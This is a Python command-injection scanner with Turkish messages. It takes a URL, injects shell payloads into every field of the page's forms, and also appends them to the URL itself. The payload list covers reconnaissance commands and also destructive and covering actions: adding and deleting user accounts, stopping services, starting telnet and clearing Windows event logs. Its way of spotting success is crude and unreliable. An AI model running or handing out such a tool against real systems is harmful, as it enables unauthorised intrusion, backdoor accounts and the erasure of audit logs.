import requests
from bs4 import BeautifulSoup

commands = [
    "&& help", "&& dir", "&& pwd", "&& cd ../../.. && dir",
    "&& ipconfig /all", "&& ifconfig", "&& ping -n 1 192.168.56.102", "&& ping -c 1 192.168.56.102",
    "&& set", "&& whoami", "&& net view", "&& net user", "&& net localgroup",
    "&& net user <username> /add", "&& useradd <username>",
    "&& net user <username> /delete", "&& net stop <service name>", "&& net start telnet", "&& net stop telnet",
    "&& wevtutil cl"
]

def inject_commands(url, forms):
    vulnerable_forms = []

    for form in forms:
        form_data = {}
        for field in form.find_all('input'):
            form_data[field.get('name')] = field.get('value') or ''  

        for command in commands:
            try:
                payload = f"$(echo '{command}')"
                form_data_copy = form_data.copy()
                for key, value in form_data_copy.items():
                    form_data_copy[key] = value + payload
                response = requests.post(url, data=form_data_copy)

                if response.status_code == 200:
                    if "command not found" not in response.text.lower() and "no such file or directory" not in response.text.lower():
                        vulnerable_forms.append(form_data_copy)
            except Exception as e:
                print("Form gönderilirken hata:", e)

    if vulnerable_forms:
        print("Formlara başarıyla komut enjeksiyonu yapıldı. İşe yarayan form verileri:")
        for form_data in vulnerable_forms:
            print(form_data)
    else:
        print("Sayfada form bulunamadı, doğrudan URL'ye istek gönderilecek.")

    return vulnerable_forms

def test_command_injection(url):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')
            if forms:
                inject_commands(url, forms)
            else:
                print("Sayfada form bulunamadı, doğrudan URL'ye istek gönderiliyor.")
                for command in commands:
                    try:
                        payload = f"$(echo '{command}')"
                        response = requests.get(url + payload, timeout=5)

                        if response.status_code == 200:
                            if "command not found" not in response.text.lower() and "no such file or directory" not in response.text.lower():
                                print(f"Komut enjeksiyonu başarılı: {url + payload}")
                    except requests.exceptions.Timeout:
                        print(f"Timeout: {url + payload}")
                    except Exception as e:
                        print(f"Hata: {url + payload} - {e}")
        else:
            print("URL'ye erişilemiyor, lütfen URL'nin doğru olduğundan emin olun.")
    except Exception as e:
        print("URL'ye erişilemiyor, lütfen URL'nin doğru olduğundan emin olun.", e)


url = input("Test edilecek URL'yi girin: ")


test_command_injection(url)
